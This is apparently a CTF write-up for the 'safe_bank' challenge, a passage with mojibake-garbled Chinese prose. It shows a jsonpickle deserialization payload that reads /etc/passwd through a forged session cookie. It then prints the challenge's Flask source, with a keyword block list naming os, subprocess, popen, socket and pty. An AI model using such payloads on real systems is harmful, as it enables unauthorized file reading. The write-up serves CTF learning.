import{_ as s,c as a,a as p,o as t}from"./app-CkMZScaH.js";const e={};function o(c,n){return t(),a("div",null,[...n[0]||(n[0]=[p(`<h1 id="safe-bank" tabindex="-1"><a class="header-anchor" href="#safe-bank"><span>safe_bank</span></a></h1><p>â€‹ æœ¬é¢˜æ˜¯åœ¨Nepctfä¸­é‡åˆ°äº†ä¸€é“é¢˜ï¼Œæ˜¯æ¥è§¦CTFä¸ä¹…çš„ä¸€æ¬¡æ¯”èµ›ï¼Œæ˜¯æˆ‘ç¬¬ä¸€æ¬¡æ¥è§¦jsonpickleååºåˆ—åŒ–ï¼Œå…¶ä¸­clearçš„æ€è·¯æ¥è‡ªPid,å±äºéé¢„æœŸè§£ï¼Œä½†æ˜¯æ˜¯çœŸä¸å¥½æƒ³å•ŠğŸ˜­ã€‚</p><p>â€‹ é¢˜ç›®ä¸­æè¿°å¦‚ä¸‹ï¼š</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code><span class="line">Python Flaskä½œä¸ºWebæ¡†æ¶</span>
<span class="line">JSONç”¨äºæ•°æ®äº¤æ¢</span>
<span class="line">ä½¿ç”¨jsonpickleçš„é«˜çº§ä¼šè¯ç®¡ç†</span>
<span class="line">Base64ç¼–ç ç”¨äºTokenä¼ è¾“</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>â€‹ æˆ‘ä»¬éšä¾¿æ³¨å†Œä¸€ä¸ªè´¦å·æ‹¿åˆ°cookieå¦‚ä¸‹</p><div class="language-json line-numbers-mode" data-highlighter="prismjs" data-ext="json"><pre><code><span class="line">eyJweS9vYmplY3QiOiAiX19tYWluX18uU2Vzc2lvbiIsICJtZXRhIjogeyJ1c2VyIjogIjEyMzQiLCAidHMiOiAxNzUzNzkyODQzfX0=</span>
<span class="line"></span>
<span class="line"><span class="token punctuation">{</span><span class="token property">&quot;py/object&quot;</span><span class="token operator">:</span> <span class="token string">&quot;__main__.Session&quot;</span><span class="token punctuation">,</span> <span class="token property">&quot;meta&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token property">&quot;user&quot;</span><span class="token operator">:</span> <span class="token string">&quot;1234&quot;</span><span class="token punctuation">,</span> <span class="token property">&quot;ts&quot;</span><span class="token operator">:</span> <span class="token number">1753792843</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>â€‹ ç¡®è®¤æ–¹å‘ä¸ºjsonpickleååºåˆ—åŒ–</p><p>â€‹ æˆ‘ä»¬ä¿®æ”¹userçš„å€¼</p><div class="language-json line-numbers-mode" data-highlighter="prismjs" data-ext="json"><pre><code><span class="line"><span class="token punctuation">{</span><span class="token property">&quot;py/object&quot;</span><span class="token operator">:</span> <span class="token string">&quot;__main__.Session&quot;</span><span class="token punctuation">,</span> <span class="token property">&quot;meta&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token property">&quot;user&quot;</span><span class="token operator">:</span> <span class="token string">&quot;114514&quot;</span><span class="token punctuation">,</span> <span class="token property">&quot;ts&quot;</span><span class="token operator">:</span> <span class="token number">1753792843</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line"></span>
<span class="line">eyJweS9vYmplY3QiOiAiX19tYWluX18uU2Vzc2lvbiIsICJtZXRhIjogeyJ1c2VyIjogIjExNDUxNCIsICJ0cyI6IDE3NTM3OTI4NDN9fQ==</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>â€‹ æ­¤æ—¶é¡µé¢ç”¨æˆ·åä¹Ÿç›¸åº”å˜æˆäº†114514ï¼Œå› æ­¤æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨114514å›æ˜¾ã€‚</p><table><thead><tr><th style="text-align:center;"><strong>æ ‡ç­¾</strong></th><th style="text-align:center;"><strong>åŠŸèƒ½</strong></th><th style="text-align:center;"><strong>ä½¿ç”¨åœºæ™¯</strong></th></tr></thead><tbody><tr><td style="text-align:center;"><code>py/object</code></td><td style="text-align:center;">æ ‡è¯†å®ä¾‹å¯¹è±¡çš„ç±»å‹è·¯å¾„</td><td style="text-align:center;">è‡ªå®šä¹‰ç±»å®ä¾‹é‡å»º</td></tr><tr><td style="text-align:center;"><code>py/type</code></td><td style="text-align:center;">æ ‡è¯†ç±»å‹å¯¹è±¡æœ¬èº«</td><td style="text-align:center;">åºåˆ—åŒ–ç±»å®šä¹‰</td></tr><tr><td style="text-align:center;"><code>py/state</code></td><td style="text-align:center;">å­˜å‚¨å¯¹è±¡å±æ€§çŠ¶æ€</td><td style="text-align:center;">åˆå§‹åŒ–å¯¹è±¡å±æ€§</td></tr><tr><td style="text-align:center;"><code>py/newargs</code></td><td style="text-align:center;">æŒ‡å®š <code>__new__</code> å‚æ•°</td><td style="text-align:center;">ä¸å¯å˜å¯¹è±¡åˆ›å»º</td></tr><tr><td style="text-align:center;"><code>py/ref</code> &amp; <code>py/id</code></td><td style="text-align:center;">å¤„ç†å¯¹è±¡å¼•ç”¨å’Œå”¯ä¸€æ ‡è¯†</td><td style="text-align:center;">å¾ªç¯å¼•ç”¨ä¼˜åŒ–</td></tr><tr><td style="text-align:center;"><code>py/reduce</code></td><td style="text-align:center;">æ‰§è¡Œå¯è°ƒç”¨å¯¹è±¡é‡å»º</td><td style="text-align:center;">å¤æ‚å¯¹è±¡è‡ªå®šä¹‰é‡å»º</td></tr><tr><td style="text-align:center;"><code>py/tuple</code></td><td style="text-align:center;">ä¿æŒå…ƒç»„ç±»å‹</td><td style="text-align:center;">åŒºåˆ†å…ƒç»„å’Œåˆ—è¡¨</td></tr><tr><td style="text-align:center;"><code>py/set</code></td><td style="text-align:center;">æ ‡è¯†é›†åˆç±»å‹</td><td style="text-align:center;">åºåˆ—åŒ–é›†åˆæ•°æ®ç»“æ„</td></tr></tbody></table><blockquote><p>Provided by Deepseek</p></blockquote><p>â€‹ åœ¨ä¸‹æ–¹æºç ä¸­æˆ‘ä»¬å¯ä»¥å‘ç°<code>jsonpickle.decode(decoded, safe=True)</code>ï¼Œæ‰€ä»¥<code>py/reduce</code>æ— æ³•ä½¿ç”¨ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>py/object</code>æ¥åˆ¶å®šæ–¹æ³•è°ƒç”¨ã€‚</p><p>â€‹ è¿™é“é¢˜ä¸­æœ‰å¾ˆå¤šè¿‡æ»¤ï¼Œå¤šæ¬¡å°è¯•ä¹‹åå‘ç°<code>linecache.getliounes()</code>æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œæˆ‘ä»¬å°è¯•æ„å»ºå¦‚ä¸‹payloadï¼š</p><div class="language-json line-numbers-mode" data-highlighter="prismjs" data-ext="json"><pre><code><span class="line"><span class="token punctuation">{</span><span class="token property">&quot;py/object&quot;</span><span class="token operator">:</span><span class="token string">&quot;__main__.Session&quot;</span><span class="token punctuation">,</span><span class="token property">&quot;meta&quot;</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">&quot;user&quot;</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">&quot;py/object&quot;</span><span class="token operator">:</span><span class="token string">&quot;linecache.getlines&quot;</span><span class="token punctuation">,</span><span class="token property">&quot;py/newargsex&quot;</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token property">&quot;py/set&quot;</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">&quot;/etc/passwd&quot;</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token string">&quot;&quot;</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">&quot;ts&quot;</span><span class="token operator">:</span><span class="token number">1753532149</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>â€‹ æˆåŠŸæ˜¾ç¤º<code>/etc/passwd</code>æ–‡ä»¶å†…å®¹ï¼Œæ­¤æ—¶æˆ‘ä»¬å®ç°äº†ä»»æ„è¯»ï¼Œä½†æ˜¯ç”±äºæƒé™ä¸è¶³ï¼Œæ²¡æœ‰åŠæ³•è¯»å–/flagå†…å®¹ã€‚</p><p>â€‹ æˆ‘ä»¬è¯»å–<code>/proc/self/cmdline</code>å’Œ<code>/proc/self/pwd</code>è·å¾—å½“å‰å·¥ä½œè·¯å¾„ä¸º<code>/app</code>ï¼Œæ‰§è¡Œå‘½ä»¤ä¸º<code>python app.py</code>ï¼Œæ‹¼æ¥èµ·æ¥è·å–åˆ°æºç è·¯å¾„ï¼Œæˆ‘ä»¬è¯»å–æºç å¦‚ä¸‹ï¼š</p><div class="language-python line-numbers-mode" data-highlighter="prismjs" data-ext="py"><pre><code><span class="line"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> make_response<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> url_for</span>
<span class="line"><span class="token keyword">import</span> jsonpickle</span>
<span class="line"><span class="token keyword">import</span> base64</span>
<span class="line"><span class="token keyword">import</span> json</span>
<span class="line"><span class="token keyword">import</span> os</span>
<span class="line"><span class="token keyword">import</span> time</span>
<span class="line"></span>
<span class="line">app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span></span>
<span class="line">app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span></span>
<span class="line"></span>
<span class="line"><span class="token keyword">class</span> <span class="token class-name">Account</span><span class="token punctuation">:</span></span>
<span class="line">    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> uid<span class="token punctuation">,</span> pwd<span class="token punctuation">)</span><span class="token punctuation">:</span></span>
<span class="line">        self<span class="token punctuation">.</span>uid <span class="token operator">=</span> uid</span>
<span class="line">        self<span class="token punctuation">.</span>pwd <span class="token operator">=</span> pwd</span>
<span class="line"></span>
<span class="line"><span class="token keyword">class</span> <span class="token class-name">Session</span><span class="token punctuation">:</span></span>
<span class="line">    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> meta<span class="token punctuation">)</span><span class="token punctuation">:</span></span>
<span class="line">        self<span class="token punctuation">.</span>meta <span class="token operator">=</span> meta</span>
<span class="line"></span>
<span class="line">users_db <span class="token operator">=</span> <span class="token punctuation">[</span></span>
<span class="line">    Account<span class="token punctuation">(</span><span class="token string">&quot;admin&quot;</span><span class="token punctuation">,</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span></span>
<span class="line">    Account<span class="token punctuation">(</span><span class="token string">&quot;guest&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;guest&quot;</span><span class="token punctuation">)</span></span>
<span class="line"><span class="token punctuation">]</span></span>
<span class="line"></span>
<span class="line"><span class="token keyword">def</span> <span class="token function">register_user</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">:</span></span>
<span class="line">    <span class="token keyword">for</span> acc <span class="token keyword">in</span> users_db<span class="token punctuation">:</span></span>
<span class="line">        <span class="token keyword">if</span> acc<span class="token punctuation">.</span>uid <span class="token operator">==</span> username<span class="token punctuation">:</span></span>
<span class="line">            <span class="token keyword">return</span> <span class="token boolean">False</span></span>
<span class="line">    users_db<span class="token punctuation">.</span>append<span class="token punctuation">(</span>Account<span class="token punctuation">(</span>username<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">)</span></span>
<span class="line">    <span class="token keyword">return</span> <span class="token boolean">True</span></span>
<span class="line"></span>
<span class="line">FORBIDDEN <span class="token operator">=</span> <span class="token punctuation">[</span></span>
<span class="line">    <span class="token string">&#39;builtins&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;os&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;system&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;repr&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;__class__&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;subprocess&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;popen&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;Popen&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;nt&#39;</span><span class="token punctuation">,</span></span>
<span class="line">    <span class="token string">&#39;code&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;reduce&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;compile&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;command&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;pty&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;platform&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;pdb&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;pickle&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;marshal&#39;</span><span class="token punctuation">,</span></span>
<span class="line">    <span class="token string">&#39;socket&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;threading&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;multiprocessing&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;signal&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;traceback&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;inspect&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;\\\\\\\\&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;posix&#39;</span><span class="token punctuation">,</span></span>
<span class="line">    <span class="token string">&#39;render_template&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;jsonpickle&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;cgi&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;execfile&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;importlib&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;sys&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;shutil&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;state&#39;</span><span class="token punctuation">,</span></span>
<span class="line">    <span class="token string">&#39;import&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;ctypes&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;timeit&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;input&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;open&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;codecs&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;base64&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;jinja2&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;re&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;json&#39;</span><span class="token punctuation">,</span></span>
<span class="line">    <span class="token string">&#39;file&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;write&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;read&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;globals&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;locals&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;getattr&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;setattr&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;delattr&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;uuid&#39;</span><span class="token punctuation">,</span></span>
<span class="line">    <span class="token string">&#39;__import__&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;__globals__&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;__code__&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;__closure__&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;__func__&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;__self&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;pydoc&#39;</span><span class="token punctuation">,</span></span>
<span class="line">    <span class="token string">&#39;__module__&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;__dict__&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;__mro__&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;__subclasses__&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;__init__&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;__new__&#39;</span></span>
<span class="line"><span class="token punctuation">]</span></span>
<span class="line"></span>
<span class="line"><span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span>serialized<span class="token punctuation">)</span><span class="token punctuation">:</span></span>
<span class="line">    <span class="token keyword">try</span><span class="token punctuation">:</span></span>
<span class="line">        data <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>serialized<span class="token punctuation">)</span></span>
<span class="line">        payload <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">,</span> ensure_ascii<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></span>
<span class="line">        <span class="token keyword">for</span> bad <span class="token keyword">in</span> FORBIDDEN<span class="token punctuation">:</span></span>
<span class="line">            <span class="token keyword">if</span> bad <span class="token keyword">in</span> payload<span class="token punctuation">:</span></span>
<span class="line">                <span class="token keyword">return</span> bad</span>
<span class="line">        <span class="token keyword">return</span> <span class="token boolean">None</span></span>
<span class="line">    <span class="token keyword">except</span><span class="token punctuation">:</span></span>
<span class="line">        <span class="token keyword">return</span> <span class="token string">&quot;error&quot;</span></span>
<span class="line"></span>
<span class="line"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">&#39;/&#39;</span><span class="token punctuation">)</span></span>
<span class="line"><span class="token keyword">def</span> <span class="token function">root</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></span>
<span class="line">    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">&#39;index.html&#39;</span><span class="token punctuation">)</span></span>
<span class="line"></span>
<span class="line"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">&#39;/register&#39;</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">&#39;GET&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;POST&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span></span>
<span class="line"><span class="token keyword">def</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></span>
<span class="line">    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">&#39;POST&#39;</span><span class="token punctuation">:</span></span>
<span class="line">        username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&#39;username&#39;</span><span class="token punctuation">)</span></span>
<span class="line">        password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&#39;password&#39;</span><span class="token punctuation">)</span></span>
<span class="line">        confirm_password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&#39;confirm_password&#39;</span><span class="token punctuation">)</span></span>
<span class="line">        </span>
<span class="line">        <span class="token keyword">if</span> <span class="token keyword">not</span> username <span class="token keyword">or</span> <span class="token keyword">not</span> password <span class="token keyword">or</span> <span class="token keyword">not</span> confirm_password<span class="token punctuation">:</span></span>
<span class="line">            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">&#39;register.html&#39;</span><span class="token punctuation">,</span> error<span class="token operator">=</span><span class="token string">&quot;æ‰€æœ‰å­—æ®µéƒ½æ˜¯å¿…å¡«çš„ã€‚&quot;</span><span class="token punctuation">)</span></span>
<span class="line">        </span>
<span class="line">        <span class="token keyword">if</span> password <span class="token operator">!=</span> confirm_password<span class="token punctuation">:</span></span>
<span class="line">            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">&#39;register.html&#39;</span><span class="token punctuation">,</span> error<span class="token operator">=</span><span class="token string">&quot;å¯†ç ä¸åŒ¹é…ã€‚&quot;</span><span class="token punctuation">)</span></span>
<span class="line">        </span>
<span class="line">        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">4</span> <span class="token keyword">or</span> <span class="token builtin">len</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">6</span><span class="token punctuation">:</span></span>
<span class="line">            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">&#39;register.html&#39;</span><span class="token punctuation">,</span> error<span class="token operator">=</span><span class="token string">&quot;ç”¨æˆ·åè‡³å°‘éœ€è¦4ä¸ªå­—ç¬¦ï¼Œå¯†ç è‡³å°‘éœ€è¦6ä¸ªå­—ç¬¦ã€‚&quot;</span><span class="token punctuation">)</span></span>
<span class="line">        </span>
<span class="line">        <span class="token keyword">if</span> register_user<span class="token punctuation">(</span>username<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">:</span></span>
<span class="line">            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">&#39;index.html&#39;</span><span class="token punctuation">,</span> message<span class="token operator">=</span><span class="token string">&quot;æ³¨å†ŒæˆåŠŸï¼è¯·ç™»å½•ã€‚&quot;</span><span class="token punctuation">)</span></span>
<span class="line">        <span class="token keyword">else</span><span class="token punctuation">:</span></span>
<span class="line">            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">&#39;register.html&#39;</span><span class="token punctuation">,</span> error<span class="token operator">=</span><span class="token string">&quot;ç”¨æˆ·åå·²å­˜åœ¨ã€‚&quot;</span><span class="token punctuation">)</span></span>
<span class="line">    </span>
<span class="line">    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">&#39;register.html&#39;</span><span class="token punctuation">)</span></span>
<span class="line"></span>
<span class="line"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>post</span><span class="token punctuation">(</span><span class="token string">&#39;/auth&#39;</span><span class="token punctuation">)</span></span>
<span class="line"><span class="token keyword">def</span> <span class="token function">auth</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></span>
<span class="line">    u <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&quot;u&quot;</span><span class="token punctuation">)</span></span>
<span class="line">    p <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&quot;p&quot;</span><span class="token punctuation">)</span></span>
<span class="line">    <span class="token keyword">for</span> acc <span class="token keyword">in</span> users_db<span class="token punctuation">:</span></span>
<span class="line">        <span class="token keyword">if</span> acc<span class="token punctuation">.</span>uid <span class="token operator">==</span> u <span class="token keyword">and</span> acc<span class="token punctuation">.</span>pwd <span class="token operator">==</span> p<span class="token punctuation">:</span></span>
<span class="line">            sess_data <span class="token operator">=</span> Session<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">&#39;user&#39;</span><span class="token punctuation">:</span> u<span class="token punctuation">,</span> <span class="token string">&#39;ts&#39;</span><span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span></span>
<span class="line">            token_raw <span class="token operator">=</span> jsonpickle<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>sess_data<span class="token punctuation">)</span></span>
<span class="line">            b64_token <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>token_raw<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span></span>
<span class="line">            resp <span class="token operator">=</span> make_response<span class="token punctuation">(</span><span class="token string">&quot;ç™»å½•æˆåŠŸã€‚&quot;</span><span class="token punctuation">)</span></span>
<span class="line">            resp<span class="token punctuation">.</span>set_cookie<span class="token punctuation">(</span><span class="token string">&quot;authz&quot;</span><span class="token punctuation">,</span> b64_token<span class="token punctuation">)</span></span>
<span class="line">            resp<span class="token punctuation">.</span>status_code <span class="token operator">=</span> <span class="token number">302</span></span>
<span class="line">            resp<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">&#39;Location&#39;</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">&#39;/panel&#39;</span></span>
<span class="line">            <span class="token keyword">return</span> resp</span>
<span class="line">    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">&#39;index.html&#39;</span><span class="token punctuation">,</span> error<span class="token operator">=</span><span class="token string">&quot;ç™»å½•å¤±è´¥ã€‚ç”¨æˆ·åæˆ–å¯†ç æ— æ•ˆã€‚&quot;</span><span class="token punctuation">)</span></span>
<span class="line"></span>
<span class="line"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">&#39;/panel&#39;</span><span class="token punctuation">)</span></span>
<span class="line"><span class="token keyword">def</span> <span class="token function">panel</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></span>
<span class="line">    token <span class="token operator">=</span> request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&quot;authz&quot;</span><span class="token punctuation">)</span></span>
<span class="line">    <span class="token keyword">if</span> <span class="token keyword">not</span> token<span class="token punctuation">:</span></span>
<span class="line">        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">&#39;root&#39;</span><span class="token punctuation">,</span> error<span class="token operator">=</span><span class="token string">&quot;ç¼ºå°‘Tokenã€‚&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span>
<span class="line">    </span>
<span class="line">    <span class="token keyword">try</span><span class="token punctuation">:</span></span>
<span class="line">        decoded <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>token<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span></span>
<span class="line">    <span class="token keyword">except</span><span class="token punctuation">:</span></span>
<span class="line">        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">&#39;error.html&#39;</span><span class="token punctuation">,</span> error<span class="token operator">=</span><span class="token string">&quot;Tokenæ ¼å¼é”™è¯¯ã€‚&quot;</span><span class="token punctuation">)</span></span>
<span class="line">    </span>
<span class="line">    ban <span class="token operator">=</span> waf<span class="token punctuation">(</span>decoded<span class="token punctuation">)</span></span>
<span class="line">    <span class="token keyword">if</span> waf<span class="token punctuation">(</span>decoded<span class="token punctuation">)</span><span class="token punctuation">:</span></span>
<span class="line">        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">&#39;error.html&#39;</span><span class="token punctuation">,</span> error<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f&quot;è¯·ä¸è¦é»‘å®¢æ”»å‡»ï¼</span><span class="token interpolation"><span class="token punctuation">{</span>ban<span class="token punctuation">}</span></span><span class="token string">&quot;</span></span><span class="token punctuation">)</span></span>
<span class="line">    </span>
<span class="line">    <span class="token keyword">try</span><span class="token punctuation">:</span></span>
<span class="line">        sess_obj <span class="token operator">=</span> jsonpickle<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>decoded<span class="token punctuation">,</span> safe<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span></span>
<span class="line">        meta <span class="token operator">=</span> sess_obj<span class="token punctuation">.</span>meta</span>
<span class="line">        </span>
<span class="line">        <span class="token keyword">if</span> meta<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&quot;user&quot;</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">&quot;admin&quot;</span><span class="token punctuation">:</span></span>
<span class="line">            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">&#39;user_panel.html&#39;</span><span class="token punctuation">,</span> username<span class="token operator">=</span>meta<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&#39;user&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span>
<span class="line">        </span>
<span class="line">        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">&#39;admin_panel.html&#39;</span><span class="token punctuation">)</span></span>
<span class="line">    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span></span>
